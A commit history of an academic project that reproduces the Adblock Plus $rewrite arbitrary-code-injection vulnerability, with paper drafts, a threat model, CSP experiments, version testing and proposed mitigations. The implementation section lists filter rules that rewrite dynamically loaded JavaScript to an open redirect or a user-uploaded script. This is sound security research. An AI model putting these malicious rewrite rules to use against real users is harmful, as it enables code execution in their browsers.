+\section{Implementation}\label{Implementation}
 TODO

### 2023-04-20 paper/paper.tex
Update from OL

@@
 Their popularity among users only makes the matter worse: a vulnerability in a popular extension can affect millions of users.
-One such popular extension is Adblock Plus, which has tens of millions of users on Chrome and Firefox combined.
-\cite{noauthor_adblockchrome_nodate, noauthor_adblockfirefox_nodate} In this article, we will investigate a vulnerability introduced in a previous version of Adblock Plus that enabled the execution of arbitrary code on users' devices.
+One such popular extension is Adblock Plus, which has tens of millions of users on Chrome and Firefox combined \cite{noauthor_adblockchrome_nodate, noauthor_adblockfirefox_nodate}.
+In this article, we will investigate a vulnerability introduced in a previous version of Adblock Plus that enabled the execution of arbitrary code on users' devices.
 
@@
 In that release, it is restricted that the new destination must be of the same origin as the original request.
-Unfortunately, this introduced new vulnerabilities that allowed arbitrary code execution on user machines that somehow applied malicious filter rules to their extension.
-\cite{abp_code_injection,abp_issue_6622,abp_rewrite_pr,abp_filter_guide}
+Unfortunately, this introduced new vulnerabilities that allowed arbitrary code execution on user machines that somehow applied malicious filter rules to their extension \cite{abp_code_injection,abp_issue_6622,abp_rewrite_pr,abp_filter_guide}.
 
@@
 One of the most popular in that category is Adblock Plus.
-According to statistics from the Chrome extensions web store and Mozilla Firefox add-on store, tens of millions of users have Adblock Plus installed.
-\cite{noauthor_adblockchrome_nodate, noauthor_adblockfirefox_nodate} According to a study by Pujol et al., 22\% of the most active users analyzed browse the Web with Adblock Plus.
-In fact, Ad-blocking extensions are so popular that advertisement vendors have begun to take active measures against them.\cite{mughees_first_2016} Therefore, vulnerabilities from the Adblock Plus extension can impact a considerable amount of internet users.
+According to statistics from the Chrome extensions web store and Mozilla Firefox add-on store, tens of millions of users have Adblock Plus installed \cite{noauthor_adblockchrome_nodate, noauthor_adblockfirefox_nodate}.
+According to a study by Pujol et al., 22\% of the most active users analyzed browse the Web with Adblock Plus.
+In fact, Ad-blocking extensions are so popular that advertisement vendors have begun to take active measures against them \cite{mughees_first_2016}.
+Therefore, vulnerabilities from the Adblock Plus extension can impact a considerable amount of internet users.
 That is why we have chosen to investigate a vulnerability in a previous version of Adblock Plus.
@@
 For example, a request to "foo.com/ad.js" can be rewritten to "foo.com/not-ad.js".
-\\
+
 There can be multiple correct usages of the rewrite filter.
@@
 That's when rewriting the request is a reasonable way to block advertisements with minimal impact on user experience.
-\\
+
 Another potential way of using the rewrite filter is eliminating certain HTTP request parameters related to privacy.
@@
 Therefore, the rewrite filter can be utilized in this scenario to eliminate request parameters related to tracking.
-\\
 
@@
 % Author: Chengcheng Ding
-There are mainly 2 goals for this project, centered around the vulnerability introduced by the first implementation of the rewrite rule, and its implications. \\
+There are mainly 2 goals for this project, centered around the vulnerability introduced by the first implementation of the rewrite rule, and its implications.
+
 The first goal is to prove that the vulnerability implies a previously understated attack surface.
@@
 For example, a crucial component of this vulnerability, open redirect, would be considered a feature instead of a vulnerability in many websites.
-As a matter of fact, Google is still choosing to keep its open redirects while acknowledging it can be a tool for phishers.\cite{noauthor_open_nodate} \\
+As a matter of fact, Google is still choosing to keep its open redirects while acknowledging it can be a tool for phishers.\cite{noauthor_open_nodate}
+
 The second goal of this project is to recreate a proof of concept of the attack scenario.
 The proof of concept will specify the versions of all of the related software, and provide a skeleton website to demonstrate the capabilities of the attack.
-The details of the proof of concept can be found in section \ref{Implementation}.\\
+The details of the proof of concept can be found in section \ref{Implementation}.
 

### 2023-04-20 paper/paper.tex
Update from OL
Writing implementation section

@@
 \usepackage{xcolor}
+\usepackage{verbatim}
+\usepackage{listings}
+\lstset{basicstyle=\ttfamily}
 \def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
@@
 The proof of concept will specify the versions of all of the related software, and provide a skeleton website to demonstrate the capabilities of the attack.
-The details of the proof of concept can be found in section \ref{Implementation}.
+The details of the proof of concept can be found in section \ref{sec:Implementation}.
 
@@
 
-\section{Implementation}\label{Implementation}
+\section{Implementation}
+\label{sec:Implementation}
+% Author: Eric Li
+
+In this section, we explain how we reproduce the attack.
+We provide a fully functioning environment for demonstrating this attack.
+We write two websites using Flask as the attacker and the victim website.
+We also add CSP logics to demonstrate the recommended mitigation in \cite{abp_code_injection}.
+
+TODO: we make our project open source?
+
+\subsection{Recreating the Environment}
+
+As \cite{abp_code_injection} mentions, the rewrite filter vulnerability is only exploitable on Adblock Plus version between 3.2 and 3.5.1.
+Thus, the first step for us is to find old version of of this extension.
+Unfortunately, the official Chrome Web Store and Add-ons for Firefox website no longer provide these versions.
+So we find old versions from unofficial sources.
+
+We are able to find old version of the extension for Chrome on Crx4Chrome \cite{cr4chrome_abp}, a website that provides archived extensions for Chrome.
+We are unable to find old version of the extension for Firefox easily.
+However, we argue that since the extension is designed to be browser-independent, the same attack should work on Firefox and Safari.
+
+Adblock Plus 3.2 cannot be directly installed on the latest version of Chromium, because the extension is packed in a deprecated format and installing the extension triggers the \lstinline{CRX_HEADER_INVALID} error.
+However, it is possible to extract the packed extension as a ZIP archive file and install the extension to Chromium in developer mode \cite{stackoverflow_crx_header_invalid}.
+
+The problem with Adblock Plus 3.2 is that it uses manifest V2.
+However, manifest V2 is deprecated and planned to be removed, so Chromium browsers in the future will not be able to install Adblock Plus 3.2 \cite{chrome_manifest_v2}.
+Thus, we demonstrate that it is possible to install Adblock Plus 3.2 on an old version of Chromium.
+
+\cite{chromium_old_download} provides guidance to download old versions of the Chromium browser. We choose Chromium 69.0.3497, a version released close to the release date of Adblock Plus 3.2.
+Following the guidance, we query the position lookup and find that the branch base position of this version is 576753.
+Finally, we can download the Chromium browser's snapshot at this version.
+Adblock Plus 3.2 can be installed directly in Chromium 69, by dragging the CRX package to the browser's extension management page.
+
+In this research, we only test reproducing the attack on Linux. However, since Chromium is a cross-platform browser, we expect the same attack to be reproducible on Windows and macOS.
+
+\subsection{Attacker Website}
+
+\subsection{Victim Website}
+
 TODO
@@
 \end{itemize}
+% Eric Li: I am editing this section on GitHub, please do not edit this section.
 
@@
 
+\appendix
+TODO: respond to peer review
+
 \end{document}

### 2023-04-20 paper/paper.tex
Sync

@@
 \section{Background and Goals}
-\subsection{Massive adaptation of ad-blocking extensions}
+\subsection{Massive Adaptation of Ad-Blocking Extensions}
 % Author: Chengcheng Ding
@@
 
-\subsection{Custom filters in Adblock Plus}
+\subsection{Custom Filters in Adblock Plus}
 % Author: Chengcheng Ding
@@
 
-\subsection{The rewrite rule: What and Why}
+\subsection{The Rewrite Rule: What and Why}
 % Author: Chengcheng Ding
@@
 
-\subsection{Goals of this project}
+\subsection{Goals of This Project}
 % Author: Chengcheng Ding
@@
 The proof of concept will specify the versions of all of the related software, and provide a skeleton website to demonstrate the capabilities of the attack.
-The details of the proof of concept can be found in section \ref{sec:Implementation}.
+The details of the proof of concept can be found in Section \ref{sec:Implementation}.
 
@@
 \label{sec:Implementation}
+% Eric Li: I am editing this section on GitHub, please do not edit this section.
 % Author: Eric Li

### 2023-04-20 paper/paper.tex
Writing

@@
 
+We implement the attacker website using Flask as the backend. We use plain HTML and JavaScript as the frontend. The attacker website has two features.
+
+First, the attacker website hosts an filter rules file that will be loaded to the victim user's browser.
+To make demonstration easy, we design an interfaces using HTML and JavaScript to modify the filter rules from a browser.
+The attacker can choose from any subset of the pre-defined 8 rules:
+
+\begin{enumerate}
+	\item Block advertisement image.
+		% ||*/static/advertisement.png
+	\item Block static JavaScript.
+		% ||*/static/static.js
+	\item Rewrite advertisement image with another image.
+		% ||*/static/advertisement.png$rewrite=/static/welcome.png
+	\item Rewrite XMLHttpRequest (XHR) that sends private information with URL that does not send private information.
+		% ||*/advertisement?city=*&role=*&company=*^$rewrite=/advertisement
+	\item Rewrite static Javacsript.
+		% ||*/static/static.js$rewrite=/static/replace.js
+	\item Rewrite dynamic JavaScript to static file.
+		% ||*/static/dynamic.js$rewrite=/static/replace.js
+	\item Rewrite dynamic JavaScript to redirect URL.
+		% ||*/static/dynamic.js$rewrite=/redirect
+	\item Rewrite dynamic JavaScript to user uploaded file.
+		% ||*/static/dynamic.js$rewrite=/upload/user.js
+\end{enumerate}
+
+Second, the attacker website needs to host the malicious JavaScript payload to be executed on the victim browser.
+To simplify our design, we host the JavaScript payload statically.
+The attacker website sets Access-Control-Allow-Origin to \lstinline{"*"} to allow the malicious JavaScript from being read by the victim website on the victim browser.
+
 \subsection{Victim Website}
+
+Similar to the attacker website, we implement the attacker website using Flask as the backend.
+We use plain HTML and JavaScript as the frontend.
+The victim website has multiple sections, as discussed below in detail.
+
+\subsubsection{Welcome Image}
+
+The victim website loads a welcome image using HTML's \lstinline{<img>} tag. This provides a image for rewriting the advertisement image later.
+
+\subsubsection{Advertisement Image}
+
+The victim website loads an advertisement image using HTML's \lstinline{<img>} tag.
+The website also uses JavaScript to detect whether loading the advertisement image is successful.
+The image is loaded successfully if the \lstinline{load} event listener is called.
+The image fails to load if the \lstinline{error} event listener is called.
+
+\subsubsection{Targeted Advertisement}
+
+The victim website loads an advertisement using XMLHttpRequest (XHR).
+The request sends information that undermines the user's privacy, such as the user's location.
+For demonstration purpose we hard code this information.
+The server returns an advertisement as a string.
+The frontend displays the string on HTML.
+
+The purpose of this section is to show that rewrite rules can modify HTTP requests to prevent leakage of users' privacy.
+
+Note that we use XMLHttpRequest (XHR) in the entire demonstration. However, other techniques like fetch also work.
+
+\subsubsection{Static JavaScript}
+
+The victim website loads a JavaScript script statically using the \lstinline{<script>} tag in HTML.
+The loaded script changes HTML to indicate that the script is loaded correctly.
+This section demonstrates that Adblock Plus is able to block a static script from loading.
+However, rewrite rules cannot modify the request to load another script instead.
+
+\subsubsection{Dynamic JavaScript}
+
+TODO
+
+\subsection{Victim User}
 

### 2023-04-20 paper/paper.tex
Writing

@@
 \usepackage{listings}
-\lstset{basicstyle=\ttfamily}
+\lstset{basicstyle=\ttfamily, upquote=true}
 \def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
@@
 We write two websites using Flask as the attacker and the victim website.
-We also add CSP logics to demonstrate the recommended mitigation in \cite{abp_code_injection}.
+We also add Content Security Policy (CSP) logics to demonstrate the recommended mitigation in \cite{abp_code_injection}.
 
@@
 
-We implement the attacker website using Flask as the backend. We use plain HTML and JavaScript as the frontend. The attacker website has two features.
+We implement the attacker website using Flask as the backend.
+The host name and port of the attacker website are \lstinline{attacker.local:8080}.
+We use plain HTML and JavaScript as the frontend.
+The attacker website has two features.
 
@@
 Similar to the attacker website, we implement the attacker website using Flask as the backend.
+The host name and port of the victim website are \lstinline{victim.local:8080}.
 We use plain HTML and JavaScript as the frontend.
@@
 
-TODO
+The victim website loads a JavaScript script dynamically when the user clicks a button.
+The browser first requests the content of the script using XHR.
+The browser then evaluates the downloaded script using \lstinline{eval()}.
+This is similar to how Google Maps dynamically load JavaScripts while the user is browsing the map.
+Similar to Google Maps, the victim website must enable \lstinline{script-src 'unsafe-eval'} in CSP to make dynamically loading JavaScript working.
+
+\subsubsection{Open Redirect}
+
+One weakness of the victim website is open redirect, where any user can define HTTP redirects in the website \cite{cwe_open_redir}.
+In the victim website, the attacker can control the URL \lstinline{/redirect} to return an HTTP 302 to any URL.
+Example URL include a JavaScript on the victim website and a JavaScript on the attacker website.
+
+The I'm Feeling Lucky button provided by Google Search has this weakness in 2019.
+When the user clicks the button, the website sends a GET request to Google's server.
+The request contains the user's query and \lstinline{btnI} parameter to indicate the user clicks the I'm Feeling Lucky button.
+Google's server returns an HTTP 302 response to the first Google Search result.
+An attacker can use this feature as an open redirect.
+The attacker simply needs to construct a Google Search query that places the redirect target as the first Google Search result.
+This weakness is fixed by Google later, as discussed in TODO.
+
+\subsubsection{User Uploaded File}
+
+Another weakness of the victim website is user uploaded file with JavaScript content \cite{cwe_upload_file}.
+The victim website does not perform any sanitization to the file uploaded, and any user of the victim website can view the uploaded file.
+Thus, if the attacker can trick the victim browser to load the uploaded file, the attacker can achieve arbitrary file execution.
+
+\subsubsection{CSP}
+
+The victim website allows dynamically configuring the website's CSP.
+This allows easy understanding the effectiveness of different defense strategies.
+In an attempt to defend, the victim user can try to remove \lstinline{script-src *} from CSP and/or to add \lstinline{connect-src 'self'} to the CSP.
+
+\subsection{Attacker User}
+
+The attacker user runs any modern browser that can run JavaScript.
+The attacker user opens the attacker website and interacts with it.
+The attacker user also interacts with the victim website by changing the open redirect target and uploading the JavaScript file.
 
@@
 
+We setup the victim user in a Linux virtual machine.
+The virtual machine runs Chromium 69.
+We install AdBlock Plus 3.2 and add the filter rules file of the attacker website to AdBlock Plus.
+The victim user then opens and interacts with victim website.
+When the attacker updates the filter rules file, the victim needs to click the update button in AdBlock Plus's configuration page.
+
+\subsection{Experiment Results}
+
 TODO
+
 \begin{itemize}

### 2023-04-21 paper/paper.tex
Writing

@@
 The victim website does not perform any sanitization to the file uploaded, and any user of the victim website can view the uploaded file.
-Thus, if the attacker can trick the victim browser to load the uploaded file, the attacker can achieve arbitrary file execution.
+Thus, if the attacker can trick the victim browser to load the uploaded file, the attacker can achieve arbitrary code execution.
 
@@
 
+Using the setup described above, we perform multiple experiments to demonstrate the capabilities of AdBlock Plus and the arbitrary code execution attack.
+
+\subsubsection{Blocking Image}
+
+AdBlock Plus can block the advertisement image in the victim website.
+However, the victim website can see that the advertisement image fails to be loaded using the JavaScript \lstinline{error} event listener.
+
+\subsubsection{Blocking Static JavaScript}
+
+AdBlock Plus can block the static JavaScript in the victim website.
+
+\subsubsection{Rewriting Image}
+
+AdBlock Plus can rewrite the advertisement image in the victim website with another image on the victim website.
+Since the \lstinline{<img>} tag successfully loads an image, the victim website cannot detect the rewrite using the JavaScript \lstinline{error} event listener.
+This demonstrates that the intended use of the rewrite feature \cite{abp_filter_guide}.
+
+\subsubsection{Rewriting Request Paramters}
+
+AdBlock Plus can rewrite an XHR request to a different URL.
+In our example, we remove the request URL's query string, which contains private information of the victim user.
+This is another intended use of the rewrite feature \cite{abp_issue_6622}.
+
+\subsubsection{Rewriting Static JavaScript}
+
+AdBlock Plus is not able to rewrite static JavaScript in the victim website.
+During the design of the rewrite feature, rewriting static JavaScript is disallowed due to security considerations \cite{abp_issue_6622}.
+
+\subsubsection{Rewriting Dynamic JavaScript}
+
+AdBlock Plus is able to rewrite dynamic JavaScript loaded from XHR request.
+So when the victim website loads a JavaScript from the its own origin dynamically, AdBlock Plus can change to let it load a different JavaScript from the same origin.
+
+\subsubsection{Attack Using Open Redirect}
+
+A victim website that loads dynamic JavaScript and has the open redirect weakness can be attacked.
+The attacker first adds AdBlock Plus rule to rewrite the dynamic JavaScript's URL to the open redirect URL.
+The attacker then controls the open redirect to return HTTP 302 to an attacker-controlled website.
+The attacker controlled website returns the malicious JavaScript code.
+
+Removing \lstinline{script-src *} from CSP does not defend against this attack. The dynamic JavaScript is downloaded using XHR, which is not controlled by \lstinline{script-src}.
+
+Adding \lstinline{connect-src 'self'} to the CSP defends against this attack.
+This rule prevents XHR from being redirected to an origin other than the victim website itself.
+However, this breaks functionality if the victim website needs to send XHR requests to other websites.
+
+\subsubsection{Attack Using User Uploaded File}
+
+A victim website that loads dynamic JavaScript and has the user uploaded file with JavaScript content weakness can be attacked.
+
 TODO
@@
 \item Limitations: further analysis on other browsers.
+\item Possible mitigation: check signature of dynamic JS before eval.
 \end{itemize}

### 2023-04-21 paper/paper.tex
Write

@@
 \label{sec:Implementation}
-% Eric Li: I am editing this section on GitHub, please do not edit this section.
 % Author: Eric Li
@@
 
-Adding \lstinline{connect-src 'self'} to the CSP defends against this attack.
+Adding \lstinline{connect-src 'self'} to CSP defends against this attack.
 This rule prevents XHR from being redirected to an origin other than the victim website itself.
@@
 A victim website that loads dynamic JavaScript and has the user uploaded file with JavaScript content weakness can be attacked.
+The attacker first uploads the malicious JavaScript file to the victim website.
+The attacker then adds AdBlock Plus rule to rewrite the dynamic JavaScript's URL to the uploaded file.
 
-TODO
+Neither removing \lstinline{script-src *} from the CSP nor adding \lstinline{connect-src 'self'} to CSP to CSP defends against this attack.
+The original dynamic JavaScript and the attacker uploaded file are both in the victim website's origin.
+Thus, blocking loading scripts from the victim website's origin will break the victim website's functionality.
 
-\begin{itemize}
-\item Recreating the environment.
-\item Adblock plus version vulnerable, browser version
-\item Attacker’s website.
-\item Victim’s website.
-\item CSP policies.
-\end{itemize}
-% Eric Li: I am editing this section on GitHub, please do not edit this section.
+\subsection{Reproducibility Analysis}
+
+To investigate the software versions this attack can take place, we try our experiment in different versions of Chromium and AdBlock Plus.
+
+We see that this attack is successful regardless of the Chromium version, as long as AdBlock Plus can be installed on Chromium.
+This attack works on both Chromium 69 (released in 2018) and Chromium 112 (released in 2023).
+
+We verify the reproducible AdBlock Plus version range mentioned in \cite{abp_code_injection}.
+The attack does not work on AdBlock Plus 3.1 (released in May 2018), which does not introduce the rewrite feature yet.
+This attack works on AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019).
+This attack does not work on AdBlock Plus 3.5.2 (released in April 2019), when the rewrite feature is redesigned to prevent the attack \cite{cr4chrome_abp}.
+
+We also try reproducing this attack on other vulnerable advertisement blockers mentioned in \cite{abp_code_injection}, including AdBlock and uBlock.
+We are not able to reproduce on uBlock.
+For unknown reason uBlock does not recognize any custom filter rules we write.
+
+We are able to reproduce this attack on AdBlock, and the reproducible version range agrees with \cite{abp_code_injection}.
+The attack does not work on AdBlock 3.31.2 (released in June 2018), which does not introduce the rewrite feature yet.
+The attack works on AdBlock 3.32.0 (released in July 2018) and 3.44.0 (released in April 2019).
+This vulnerability is fixed in AdBlock 3.46.0 (releaesd in April 2019) \cite{cr4chrome_ab}.
 

### 2023-04-23 paper/paper.tex
Remove newline
Write

@@
 \section{Discussion and Limitations}
+
+\subsection{Warnings During Design Phase}
+
 TODO
+
 \begin{itemize}
-\item How Google mitigated the issue.
+\item Public warnings previous the deploy of the \$rewrite feature.
+\end{itemize}
+
+\subsection{Mitigation by Google}
+% Author: Eric Li
+
+When AdBlock Plus 3.2 is published in 2018, Google is vulnerable to this attack because Google Maps loads dynamic JavaScript, and Google's I'm Feeling Lucky provides an open redirect weakness.
+
+Google does not mitigate this attack by removing the dynamic JavaScript.
+As of April 2023, Google Maps still loads dynamic JavaScript.
+The CSP of Google Maps contains \lstinline{script-src 'unsafe-eval'}, which is required for calling \lstinline{eval()}.
+
+Google mitigates this attack by removing the open redirect \cite{superuser_ifl_redir_notice}.
+Google uses the NID cookie to identify different users \cite{google_cookies}.
+When the user clicks the I'm Feeling Lucky button, Google computes a signature that includes the search query and a secret related to the user.
+The signature is included in the HTTP request in the \lstinline{iflsig} query field.
+If the signature verifies, the Google Search server returns HTTP 302 redirect.
+Otherwise, the server returns an HTML page asking the user to confirm the redirection.
+
+We think this defense is effective.
+When an attacker constructs the malicious AdBlock Plus rule, he or she cannot compute the signature required for the \lstinline{iflsig} query field.
+It is possible to compute the signature if the attacker is able to inject cookies to the victim user's browser and overwrites the NID cookie.
+However, we think this attack is out of scope.
+
+\subsection{Defense by Adblock Plus}
+
+TODO
+
+\begin{itemize}
 \item How Adblock Plus defended (limits the ability of filter rules).
-\item Public warnings previous the deploy of the \$rewrite feature.
+\end{itemize}
+
+\subsection{Proposed Mitigation}
+% Author: Eric Li
+
+We propose another way for websites to mitigate against this attack, even though the users uses a vulnerable extension like AdBlock Plus 3.2.
+We mitigate through the process of loading the dynamic JavaScript.
+Instead of executing whatever string returned in the HTTP response, the victim website should cryptographically verify the dynamic JavaScript fetched from the server.
+
+One possible way to implement asymmetric signatures.
+The victim server holds a public key and private key pair.
+When the victim browser loads the victim website, the victim server sends the public key to the victim browser through static JavaScript.
+When the victim browser requests dynamic JavaScript, the victim server sends the JavaScript content and signs hash of the content using the secret key.
+The victim browser verifies the signature before calling \lstinline{eval()} on the dynamic JavaScript content.
+
+The disadvantage of this mitigation is that both the server and the browser requires additional computation power and time to compute the cryptographic signature.
+This will likely increase the delay in the user interaction.
+
+\subsection{Limitations}
+
+TODO
+
+\begin{itemize}
+\item Limitations: downgrade of browser version was needed (only for manifest v3)
+\end{itemize}
+
+\subsection{Future Work}
+
+TODO
+
+\begin{itemize}
 \item Limitations: downgrade of browser version was needed.
-\item Limitations: further analysis on other browsers.
-\item Possible mitigation: check signature of dynamic JS before eval.
 \end{itemize}

### 2023-04-23 paper/paper.tex
Write

@@
 The attacker simply needs to construct a Google Search query that places the redirect target as the first Google Search result.
-This weakness is fixed by Google later, as discussed in TODO.
+This weakness is fixed by Google later, as discussed in Section~\ref{subsec:google_mitigate}.
 
@@
 \subsection{Mitigation by Google}
+\label{subsec:google_mitigate}
 % Author: Eric Li
@@
 
-\subsection{Limitations}
+\subsection{Limitations and Future Work}
+% Author: Eric Li
 
-TODO
+In this research, we only investigate the Chromium browser.
+The main reason is that Chromium browser is popular and old versions of Chrome extensions can be easily downloaded from third party archives.
+Though we expect other browsers like Firefox and Safari to behave the same, future work is needed to verify this behavior.
+We expect compiling AdBlock Plus from source when testing on other browsers.
 
-\begin{itemize}
-\item Limitations: downgrade of browser version was needed (only for manifest v3)
-\end{itemize}
+In this research, we also investigate the Linux operating system. Future work is expected to verify whether the attack still works on other operating systems like Windows and macOS.
 
-\subsection{Future Work}
-
-TODO
-
-\begin{itemize}
-\item Limitations: downgrade of browser version was needed.
-\end{itemize}
+Since AdBlock Plus 3.2 uses manifest V2, the reproducibility of our demo depends on the browser supporting manifest V2.
+Chrome is in the process of ending support for manifest V2, but the exact timeline is not determined as of this research \cite{chrome_manifest_v2}.
+Thus, to reproduce this demo in the future when only manifest V3 is supported, the the Chromium browser must be downgraded.
 

### 2023-04-24 attacker/attacker.py
Add license to source files

@@ -1,3 +1,21 @@
+#
+#   Demo of Arbitrary Code Injection in Adblock Plus
+#   Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+#
+#   This program is free software: you can redistribute it and/or modify
+#   it under the terms of the GNU Affero General Public License as published
+#   by the Free Software Foundation, either version 3 of the License, or
+#   (at your option) any later version.
+#
+#   This program is distributed in the hope that it will be useful,
+#   but WITHOUT ANY WARRANTY; without even the implied warranty of
+#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#   GNU Affero General Public License for more details.
+#
+#   You should have received a copy of the GNU Affero General Public License
+#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
+#
+
 from flask import Flask, request, render_template, make_response
 import json
 from threading import Lock

### 2023-04-24 attacker/static/script.js

@@ -1,3 +1,21 @@
+/*
+ *  Demo of Arbitrary Code Injection in Adblock Plus
+ *  Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+ *
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU Affero General Public License as published
+ *  by the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU Affero General Public License for more details.
+ *
+ *  You should have received a copy of the GNU Affero General Public License
+ *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 function handle_check(event) {
 	const payload = new FormData();
 	for (let i = 0;; i++) {

### 2023-04-24 victim/static/advertisement.js

@@ -1,3 +1,21 @@
+/*
+ *  Demo of Arbitrary Code Injection in Adblock Plus
+ *  Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+ *
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU Affero General Public License as published
+ *  by the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU Affero General Public License for more details.
+ *
+ *  You should have received a copy of the GNU Affero General Public License
+ *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 // https://stackoverflow.com/questions/9815762/
 
 {

### 2023-04-24 victim/static/dynamic.js

@@ -1,3 +1,21 @@
+/*
+ *  Demo of Arbitrary Code Injection in Adblock Plus
+ *  Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+ *
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU Affero General Public License as published
+ *  by the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU Affero General Public License for more details.
+ *
+ *  You should have received a copy of the GNU Affero General Public License
+ *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 document.getElementById("djs").innerText = "Dynamic JS loaded";
 document.getElementById("djs").className = "success";
 

### 2023-04-24 victim/static/replace.js

@@ -1,3 +1,21 @@
+/*
+ *  Demo of Arbitrary Code Injection in Adblock Plus
+ *  Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+ *
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU Affero General Public License as published
+ *  by the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU Affero General Public License for more details.
+ *
+ *  You should have received a copy of the GNU Affero General Public License
+ *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 document.getElementById("sjs").innerText = "REPLACED JS";
 document.getElementById("sjs").className = "warn";
 

### 2023-04-24 victim/static/script.js

@@ -1,3 +1,21 @@
+/*
+ *  Demo of Arbitrary Code Injection in Adblock Plus
+ *  Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+ *
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU Affero General Public License as published
+ *  by the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU Affero General Public License for more details.
+ *
+ *  You should have received a copy of the GNU Affero General Public License
+ *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 document.getElementById("load").addEventListener("click", function(event) {
 	event.preventDefault();
 	const req = new XMLHttpRequest();

### 2023-04-24 victim/static/static.js

@@ -1,3 +1,21 @@
+/*
+ *  Demo of Arbitrary Code Injection in Adblock Plus
+ *  Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+ *
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU Affero General Public License as published
+ *  by the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU Affero General Public License for more details.
+ *
+ *  You should have received a copy of the GNU Affero General Public License
+ *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 document.getElementById("sjs").innerText = "Static JS loaded";
 document.getElementById("sjs").className = "success";
 

### 2023-04-24 victim/victim.py

@@ -1,3 +1,21 @@
+#
+#   Demo of Arbitrary Code Injection in Adblock Plus
+#   Copyright (C) 2023  Eric Li, Teresa Alberto, and Chengcheng Ding
+#
+#   This program is free software: you can redistribute it and/or modify
+#   it under the terms of the GNU Affero General Public License as published
+#   by the Free Software Foundation, either version 3 of the License, or
+#   (at your option) any later version.
+#
+#   This program is distributed in the hope that it will be useful,
+#   but WITHOUT ANY WARRANTY; without even the implied warranty of
+#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#   GNU Affero General Public License for more details.
+#
+#   You should have received a copy of the GNU Affero General Public License
+#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
+#
+
 from flask import Flask, request, render_template, make_response, redirect
 import json
 from threading import Lock

### 2023-04-24 paper/paper.tex
Update from overleaf

@@
 For example, a crucial component of this vulnerability, open redirect, would be considered a feature instead of a vulnerability in many websites.
-As a matter of fact, Google is still choosing to keep its open redirects while acknowledging it can be a tool for phishers.\cite{noauthor_open_nodate}
+As a matter of fact, Google doesn't consider open redirects to be a security vulnerability to be accepted as part of its Vulnerability Disclosure Program, even while acknowledging it can be a tool for phishers.\cite{noauthor_open_nodate}
 
@@
 
+\section{Threat model}
+The threat model implies a remote attacker with the ability to abuse the rewrite filter of Adblock Plus installed in the victim's browser.
+In this scenario, the attacker may be an insider employee of Adblock Plus or an open-source malicious contributor to its codebase.
+In both cases, the attacker needs to include a malicious rewrite rule in the preinstalled filter lists that are enabled by default when installing the extension.
+An alternative scenario would be a malicious actor that convinces the victim to install and enable a malicious filter that includes a malicious rewrite rule in it.
+Eyeo, the company behind Adblock Plus, makes it clear that the filters are maintained by third parties (even the defaults ones that come preinstalled when installing the extension) and that they neither have control over their contents nor are responsible for any damage provoked to the user in relation to them \cite{abp_suscriptions}.
+
+The victim needs to have installed a vulnerable version of Adblock Plus in the browser, with the malicious filter enabled.
+For the attack to succeed the victim needs to visit the page that will be rewritten by the malicious rewrite filter.
 \section{Attack Outline}

### 2023-04-26 victim/static/dynamic-replace.js
Prevent rewriting static js

@@ -16,9 +16,6 @@
  *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
-document.getElementById("sjs").innerText = "REPLACED JS";
-document.getElementById("sjs").className = "warn";
-
